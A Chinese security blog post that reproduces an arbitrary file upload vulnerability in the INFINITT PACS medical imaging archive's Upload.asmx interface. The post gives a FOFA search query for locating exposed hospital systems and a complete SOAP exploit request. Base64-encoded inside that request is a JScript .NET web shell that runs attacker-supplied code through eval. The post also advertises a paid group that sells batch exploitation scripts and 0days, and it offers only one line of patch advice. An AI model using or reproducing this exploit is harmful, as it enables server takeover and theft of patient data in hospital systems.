#  「漏洞复现」英飞达医学影像存档与通信系统 Upload.asmx 任意文件上传漏洞   
冷漠安全  冷漠安全   2024-06-16 11:21  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
英飞达医学影像存档与通信系统 Picture Archiving and Communication System，它是应用在医院影像科室的系统，主要的任务就是把日常产生的各种医学影像（包括核磁，CT，超声，各种X光机，各种红外仪、显微仪等设备产生的图像）通过各种接口（模拟，DICOM，网络）以数字化的方式海量保存起来，当需要的时候在一定的授权下能够很快的调回使用，同时增加一些辅助诊断管理功能。它在各种影像设备间传输数据和组织存储数据具有重要作用。  
  
0x03  
  
**漏洞威胁**  
  
英飞达医学影像存档与通信系统 Upload.asmx 接口任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0orKwicGtPKC65JqHHh74NGxnaE7N46AAaDicme8OKvw2fyvdZztjYNXLoO8ib17TVetMn8VCgWApzUg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
POST /webservices/Upload.asmx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/UploadData"
Connection: close
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadData xmlns="http://tempuri.org/">
<guid>1</guid>
<patientId>1</patientId>
<patientName>1</patientName>
<fileName>test.asmx</fileName>
<fileSize>1000</fileSize>
<file>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>
</UploadData>
</soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0orKwicGtPKC65JqHHh74NGx6utVGPyxibcuFibvkvbDA3IeFsfsE3ibQGMiavhicQzeV4QpxeZUv6zbjbw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0orKwicGtPKC65JqHHh74NGxDypqEW5Opj0IlWniavwZNcumFBZRCUccB5nhxowMOhFsylYuaHQ5zfA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0orKwicGtPKC65JqHHh74NGxg9Lrfp0yaaoR0HoStmVjQJpFSuo5vlN1uEtiaMOBGEsmnMWMYiad3BAw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
关注厂商及时更新补丁或升级至安全版本  
```
https://www.infinitt.vip/icnweb/
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0orKwicGtPKC65JqHHh74NGxcYfeVtY1jSOxQukVaLBsvFIE2LnG0nNWrA9vX0a8BYVuzNPY5dX6nA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0orKwicGtPKC65JqHHh74NGx7R0jibCRib4pW3jfQTiclRBzU5wHSEZomRyKictW4oM7Bk55ITu6EGlUAA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
